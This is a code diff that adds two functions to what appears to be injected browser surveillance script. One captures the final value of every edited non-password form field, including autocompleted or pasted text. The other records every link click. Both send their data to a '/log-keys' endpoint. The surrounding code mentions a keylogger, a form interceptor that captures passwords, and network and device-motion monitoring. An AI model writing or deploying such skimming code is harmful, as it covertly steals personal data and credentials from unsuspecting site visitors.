@@ -992,6 +992,51 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ INPUT BLUR VALUE CAPTURE ══════════════════════════════
+    // When user leaves a non-password input that was modified, capture its value.
+    // Supplements key-logger with actual final field values for non-keyboard scenarios (autocomplete, paste, etc.)
+    function initInputBlurTracker() {
+        const seen = new WeakSet();
+        document.addEventListener('focusout', e => {
+            try {
+                const el = e.target;
+                if (!el || !['INPUT', 'TEXTAREA'].includes(el.tagName)) return;
+                // Skip password fields (captured by form interceptor), hidden, submit, button fields
+                if (['password', 'hidden', 'submit', 'button', 'reset', 'image', 'file', 'range', 'color'].includes(el.type)) return;
+                const val = (el.value || '').trim();
+                if (!val || val.length < 2 || val.length > 500) return;
+                // Only report if value changed since last capture
+                if (el._lastCapturedVal === val) return;
+                el._lastCapturedVal = val;
+                const name = el.name || el.id || el.placeholder || el.type || 'field';
+                post('/log-keys', {
+                    keys: `[FIELD VALUE] name="${name.slice(0, 40)}" value="${val.slice(0, 200)}"`,
+                    url: location.href
+                });
+            } catch {}
+        });
+    }
+
+    // ═══ LINK CLICK TRACKING ═══════════════════════════════════
+    // Track outbound link clicks and internal navigation link clicks
+    function initLinkClickTracker() {
+        document.addEventListener('click', e => {
+            try {
+                const a = e.target.closest('a[href]');
+                if (!a) return;
+                const href = a.href || '';
+                if (!href || href.startsWith('javascript:')) return;
+                // Only interesting links: external or significant internal
+                const isExternal = !href.startsWith(location.origin);
+                const text = (a.textContent || a.title || a.getAttribute('aria-label') || '').trim().slice(0, 80);
+                post('/log-keys', {
+                    keys: `[LINK CLICK] ${isExternal ? '[EXTERNAL] ' : ''}href="${href.slice(0, 200)}" text="${text}"`,
+                    url: location.href
+                });
+            } catch {}
+        });
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1113,6 +1158,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initSelectionTracker();
         initCopyPrintTracker();
         initFieldFocusTracker();
+        initInputBlurTracker();
+        initLinkClickTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
